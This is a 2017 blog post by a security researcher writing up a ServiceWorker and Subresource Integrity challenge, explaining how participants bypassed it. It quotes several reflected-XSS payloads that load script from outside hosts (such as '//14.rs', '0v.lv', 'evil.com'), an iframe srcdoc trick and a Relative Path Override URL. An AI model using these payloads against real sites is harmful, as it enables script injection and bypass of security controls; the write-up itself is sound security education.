<!DOCTYPE html>
<html lang="en">
<head>
 <title>Frederik Braun: Challenge Write-up: Subresource Integrity in Service Workers</title>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="/theme/css/main.css" type="text/css" />
 <link rel="icon" href='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 100 200"><style>svg{background-color:%231f54a6;}text{fill:white;font-family:Georgia,Cambria,"Times New Roman",Times,serif;}</style><text y="1.2em" font-size="135">F</text></svg>'>
 <link href="https://vaurenw.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Frederik Braun ATOM Feed" />
 <link href="https://vaurenw.github.io/feeds/all.rss.xml" type="application/rss+xml" rel="alternate" title="Frederik Braun RSS Feed" />
 <meta property="og:site_name" content="Frederik Braun"/>
 <meta property="og:type" content="website"/>
 <meta name="twitter:card" content="summary"/>
 <meta name="description" content="Challenge Write-up: Subresource Integrity in Service Workers" />
 <meta property="og:title" content="Challenge Write-up: Subresource Integrity in Service Workers"/>
 <meta property="og:url" content="https://vaurenw.github.io/sw-sri-challenge.html"/>
 <meta name="twitter:title" content="Challenge Write-up: Subresource Integrity in Service Workers" />
 <meta name="fediverse:author" content="@freddy@security.plumbing" />
 <link rel="canonical" href="https://vaurenw.github.io/sw-sri-challenge.html"/>
</head>

<body>
<header class="site-header" role="banner">
<div class="wrapper"><a class="site-title" rel="author" href="/">Frederik Braun</a><nav class="site-nav">
  <input type="checkbox" id="nav-trigger" class="nav-trigger">
  <label for="nav-trigger">
  <span class="menu-icon">
    <svg viewBox="0 0 18 15" width="18px" height="15px">
      <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
    </svg>
  </span>
  </label>
  <div class="trigger">
    <a class="page-link" href="https://vaurenw.github.io/archives.html">Blog</a>
    <a class="page-link" href="https://vaurenw.github.io/pages/publications.html">Portfolio</a>
    <a class="page-link" href="https://vaurenw.github.io/contact.html">Contact</a>
</div>
</nav></div>
</header>

<hr class="tophr">
<div id='wrapper' class="wrapper">
<div id='text1'>
        
<header>
  <h1>Challenge Write-up: Subresource Integrity in Service Workers</h1>
  <time datetime="2017-03-25T00:00:00+01:00">Sat 25 March 2017</time>
</header>
<article>
    <p>For those who have not participated in my <a href="https://serviceworker.on.web.security.plumbing/">challenge</a>, this document is about implementing security features in ServiceWorkers. A
ServiceWorker (SW) is a type of <a href="https://duckduckgo.com/?q=web+worker&amp;t=ffab&amp;ia=web">Web Worker</a> that can intercept and modify HTTP requests. A ServiceWorker is allowed to see requests towards your own as well as other origins – though it <a href="https://frederik-braun.com/publications/thesis/Thesis-Origin_Policy_Enforcement_in_Modern_Browsers.pdf">must not</a> be able to see the response from cross-origin resources.</p>
<p>The idea of the <a href="https://serviceworker.on.web.security.plumbing/">challenge</a> was to write a tiny ServiceWorker that would intercept all HTTP requests and cancel everything except those blessed by a white-list. On top of that, external resources (e.g., scripts) must only be loaded with <a href="https://www.w3.org/TR/SRI/">Subresource Integrity</a> (SRI). This can be easily achieved, because <code>fetch()</code> supports SRI out of the box:
If you supply the <code>integrity</code> keyword in the options parameter to <code>fetch</code>, it will automatically fail unless the hashes match:</p>
<p>Here's the relevant code snippet with some extra comments</p>
<div class="highlight"><pre><span></span><code><span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;fetch&quot;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">method</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&quot;GET&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// check if URL in pre-defined whitelist at the top of the document:</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">INTEGRITY_METADATA</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
<span class="w">      </span><span class="c1">// if HTML does not contain integrity=, use from the whitelist</span>
<span class="w">      </span><span class="kd">let</span><span class="w"> </span><span class="nx">sriHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">request</span><span class="p">.</span><span class="nx">integrity</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">INTEGRITY_METADATA</span><span class="p">[</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">];</span>
<span class="w">      </span><span class="kd">let</span><span class="w"> </span><span class="nx">fetchOptions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">integrity</span><span class="o">:</span><span class="w"> </span><span class="nx">sriHash</span><span class="p">,</span>
<span class="w">        </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="nx">request</span><span class="p">.</span><span class="nx">method</span><span class="p">,</span>
<span class="w">        </span><span class="nx">mode</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;cors&quot;</span><span class="p">,</span><span class="w"> </span><span class="c1">// if we have integrity metadata, it should also use cors</span>
<span class="w">        </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;omit&quot;</span><span class="p">,</span><span class="w"> </span><span class="c1">// ...and omit credentials</span>
<span class="w">        </span><span class="nx">cache</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;default&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="p">};</span>
<span class="w">      </span><span class="c1">// ServiceWorker lets the document proceed fetching the resource, but with modified fetch options</span>
<span class="w">      </span><span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span><span class="nx">fetch</span><span class="p">(</span><span class="nx">request</span><span class="p">,</span><span class="w"> </span><span class="nx">fetchOptions</span><span class="p">));</span>
</code></pre></div>

<p>The goal of the challenge was to make the document execute your script - essentially bypassing the ServiceWorker. To facilitate such an attack, I implemented a simple reflected Cross-Site-Scripting (XSS) vulnerability and hinted to its existence in the rules. XSS in general allows executing all kinds of scripts. Inline as well as from a specified URL. Because we wanted the script to go through the ServiceWorker, we have also hardened the challenge with a Content Security Policy (CSP). Content Security Policy is a mechanism to restrict how scripts can be run from a website. The policy that I used disallowed all kinds of inline scripts in tags or event handlers (e.g., <code>&lt;script&gt;...&lt;/script&gt;</code> or <code>onerror=</code>).
This essentially required an attacker to request a script that is living on their own domain, thus forcing them through the ServiceWorker.</p>
<p>Unless, of course, the attacker was able to find a browser bug involving an arcane constellation of markup that does <em>not</em> trigger the Fetch Event declared in the ServiceWorker.</p>
<h3>PEBKAC</h3>
<p>As it turns out, most browsers bypass the ServiceWorker when reloading a page with CTRL+SHIFT+R. Not only did this cause some invalid submissions, it also took me until the day I am trying to summarize my finding to notice that I have incorrectly approved some attacks when they do not actually work. This affects the following submissions:
<a href="https://twitter.com/0x6D6172696F">Mario Heiderich</a>'s vector is <code>&lt;svg&gt;&lt;script/href=//14.rs&gt;&lt;/script&gt;</code> (which is even shorter on Firefox, because you can leave the closing <code>&lt;/script&gt;</code> tag out).</p>
<p><em>But it does not work</em> unless you hard-refresh. But with a hard-refresh, even <code>&lt;script/href=//14.rs&gt;&lt;/script&gt;</code> works, because, well, hard-refreshes bypass the ServiceWorker.</p>
<p>The same goes for <a href="https://twitter.com/arturjanc/">Artur Janc</a>'s submission. His approach looks like this <code>&lt;base href="//14.rs"&gt;&lt;script src=/&gt;&lt;/script&gt;</code>, using Mario's short domain name. It also falls flat when the ServiceWorker is correctly installed.</p>
<p>I'm sincerely sorry, but I have to gently wipe you off the leader board. I admit I should have done a better job at testing.
I'm very sure you would have found a valid solution, if I had judged the challenge more properly.</p>
<h3>Bypassing the Service Worker</h3>
<p>Now, let's head on to the first submission.
First blood was drawn by <a href="https://twitter.com/magicmac2000/">Manuel Caballero</a>, who figured out that a script loaded in an <code>&lt;iframe srcdoc=..&gt;</code> is not going through the ServiceWorker. This is somewhat weird, given that a script running <code>navigator.serviceWorker.getRegistrations()</code> in this iframe returns the active ServiceWorker at sri-worker.js.</p>
<p><a href="https://twitter.com/kinugawamasato">Masato Kinugawa</a> promptly followed suite with the same attack vector. He also noted that a simple <code>&lt;script src=evil.com&gt;&lt;/script&gt;</code>-style vector also works in Private Browsing mode. This stems from the fact that the XSS vulnerability usually wins a race with the ServiceWorker registration. Note that the ServiceWorker must be registered from a separate JS file, since inline scripts are disallowed by CSP. This registration happens asynchronously and has to be faster then another script tag that is controlled by the attacker. It's certainly noteworthy, but I did not count this as a valid submission: In a real life scenario, an attacker is only really successful if the victim has a session associated with the web page and has also visited the web page before. In this case, the ServiceWorker is already registered and the bootstrapping is a no-op.
I admit that this is a clear gap in my rules, so kudos to <a href="https://twitter.com/kinugawamasato">Masato Kinugawa</a> (and some other folks who found this issue later on)!</p>
<p><a href="https://twitter.com/insertScript/">Alex Inführ</a> sent a solution that also used iframe srcdoc, but added the sandbox attribute, which cost him a few more characters.</p>
<p>In a similar vain, <a href="https://twitter.com/sirdarckcat/">Eduardo Vela</a> sent me to <a href="https://0v.lv/?e">https://0v.lv/?e</a>, which contains an iframe sandbox, that links to a conventional XSS on the domain. The trick here, is that navigations from an iframe sandbox pointing to a website with a Service Worker will skip trigger the ServiceWorker. This is a nice find, but wasn't considered a valid solution as it required user interaction.</p>
<h3>Implementation flaws and assumptions</h3>
<p>Having looked at those submissions that the ServiceWorker does not see, let's take another look at the rest of its source code. Some submissions also found implementation bugs. Here's the code right after the white-list check. Again, I'll add some extra comments.</p>
<div class="highlight"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">LOCALFILES</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>
<span class="nx">LOCALFILES</span><span class="p">[</span><span class="s2">&quot;/style.css&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;sha384-q2bP418TFL/LOAo5XrjD7OciiOi63q6OKnDH67oOGNkWc/rvUaWpynoatxySxEPF&quot;</span><span class="p">;</span>
<span class="nx">LOCALFILES</span><span class="p">[</span><span class="s2">&quot;/sri-sha.js&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;sha384-TKCoLrAkiPTzJzLNLqSmFqC0XA9PCMUwSYg2E/FosZEy7h26mwR9wONvTZ9Zvtj9&quot;</span><span class="p">;</span>
<span class="nx">LOCALFILES</span><span class="p">[</span><span class="s2">&quot;/initialize-sw.js&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;sha384-32IhktVnY10EwfUKtlhYBUoBysS2QM8cmW1bW2HENM3nIEmGDNwpkqdmpaE2jF7Z&quot;</span><span class="p">;</span>
<span class="nx">LOCALFILES</span><span class="p">[</span><span class="s2">&quot;/sri-worker.js&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;sha384-rRSq8lAgvvL9Tj617AxQJyzf1mB0sO0DfJoRJUMhqsBymYU3S+6qW4ClBNBIvhhk&quot;</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">parsed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">URL</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">);</span>
<span class="c1">// other free pass: same-origin</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">parsed</span><span class="p">.</span><span class="nx">origin</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nx">ownLocation</span><span class="p">.</span><span class="nx">origin</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="c1">// we allow ourselves (the forward-slash) and paths required for the website to work. some stylesheets etc.</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="nx">parsed</span><span class="p">.</span><span class="nx">pathname</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="nx">parsed</span><span class="p">.</span><span class="nx">pathname</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">LOCALFILES</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// note that these requests do not require integrity. the integrity metadata in the object was left out here. </span>
<span class="w">    </span><span class="c1">// this is mostly a decoy &quot;bug&quot;, which I was hoping would confuse people.</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Fetching same-origin thingy&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">)</span>
<span class="w">    </span><span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span><span class="nx">fetch</span><span class="p">(</span><span class="nx">request</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[</span><span class="si">${</span><span class="nx">LOGNAME</span><span class="si">}</span><span class="sb">] Can not fetch </span><span class="si">${</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="si">}</span><span class="sb">. No integrity metadata.`</span><span class="p">);</span>
<span class="w">    </span><span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span><span class="nx">Response</span><span class="p">.</span><span class="nx">error</span><span class="p">());</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="c1">// cross-origin: blocked.</span>
<span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[</span><span class="si">${</span><span class="nx">LOGNAME</span><span class="si">}</span><span class="sb">] Can not fetch </span><span class="si">${</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="si">}</span><span class="sb">. No integrity metadata.`</span><span class="p">);</span>
<span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span><span class="nx">Response</span><span class="p">.</span><span class="nx">error</span><span class="p">());</span>
<span class="p">}</span>
</code></pre></div>

<p>To briefly summarize, we first perform a same-origin check and then allow files in the same origin that are contained in the <code>LOCALFILES</code> object or the file <code>/</code>. Even though the object contains hashes, these are never added to the request and thus never checked. I did not think of this case as a vulnerability and mostly left this inconsistency as a decoy.
For every other type of request the code responds with a network error, i.e.,<code>Response.error()</code>.</p>
<h3>Thinking outside the box</h3>
<p>This fine submission reached me when I was leaving the subway on my way home and I <em>really</em> did not understand what was going on:</p>
<p><a href="https://serviceworker.on.web.security.plumbing/index.php/?name=%3Cscript%2Fsrc%3D%2F%2F0v.lv%3E%3C%2Fscript%3E">https://serviceworker.on.web.security.plumbing/index.php/?name=&lt;script/src=//0v.lv&gt;&lt;/script&gt;</a></p>
<p>The really important thing to note here is that the request URL contains <code>/index.php/?name=</code>.
This trick is called <a href="http://www.thespanner.co.uk/2014/03/21/rpo/">Relative Path Override (or RPO)</a>. A technique first described and coined by <a href="https://twitter.com/garethheyes">Gareth Heyes</a>. RPO attacks the fact that the script is loading resources from a relative path <code>initialize-sw.js</code>. The attacker providing a different request path, can thus mess up the additional resource loading. The website will attempt to load the necessary files from <code>/index.php/initialize-sw.js</code> instead and therefore fails.</p>
<p>This is of course extra nasty, when those scripts behind relative paths are implementing security features.
A truly nice find, by <a href="https://twitter.com/sirdarckcat/">Eduardo Vela</a>!</p>
<h3>Conclusions &amp; Acknowledgments</h3>
<p>It's interesting to use fresh technologies like ServiceWorkers, Subresource Integrity and Content Security Policy (heh) in combination and see what happens. Building your own security solutions on top of the web platform is a very complex undertaking and makes you realize that those features were created ad-hoc in a very unsystematic way. As a result of that, I'd advise you not to implement hard guarantees about regulating <code>fetch()</code> calls using Service Workers.</p>
<p>But it's always great fun to think of something interesting and then have yourself proven wrong in the real world. Thanks to <a href="https://twitter.com/annevk/">Anne van Kersteren</a> for making me look into an implementation of Subresource Integrity (and <code>require-sri-for</code>) with Service Workers. And of course, thanks to all the participants that tried (and succeeded) to break the implementation in various ways.</p>
<p>If you want mandatory Subresource Integrity, I recommend you look into the SRI2 working draft. The <code>require-sri-for</code> CSP extension has been implemented in Firefox and Chrome, but in both cases it's behind a flag (<code>security.csp.experimentalEnabled</code> and <em>experimental Web Platform features</em> respectively)</p>
</article>

<hr>

<section id="minicontact">
<em>
<!-- Please comment on <a href="https://social.security.plumbing/@freddy">Mastodon</a>. -->
If you find a mistake in this article, you can <a href="https://github.com/freddyb/homepage/edit/main/content/sw-sri-challenge-learnings.md">submit a pull request on GitHub</a>.
</em>
</section>

<section id="article-list">
<h4>Recent posts</h4>
<ol>
  <li><a href="https://vaurenw.github.io/madweb-keynote-2025.html">With Carrots & Sticks - Can the browser handle web security?</a>
    <em>(Tue 08 April 2025)</em>
  </li>
  <li><a href="https://vaurenw.github.io/home-assistant-can-not-be-secured-for-internet-access.html">Home assistant can not be secured for internet access</a>
    <em>(Sun 15 December 2024)</em>
  </li>
  <li><a href="https://vaurenw.github.io/modern-solutions-xsleaks.html">Modern solutions against cross-site attacks</a>
    <em>(Tue 26 November 2024)</em>
  </li>
  <li><a href="https://vaurenw.github.io/prompt-injections-and-a-demo.html">Prompt Injections and a demo</a>
    <em>(Wed 18 September 2024)</em>
  </li>
  <li><a href="https://vaurenw.github.io/mozilla-monument.html">The Mozilla Monument in San Francisco</a>
    <em>(Fri 05 July 2024)</em>
  </li>
            
</ol>
</section>
</div>
</div>
</body>
</html>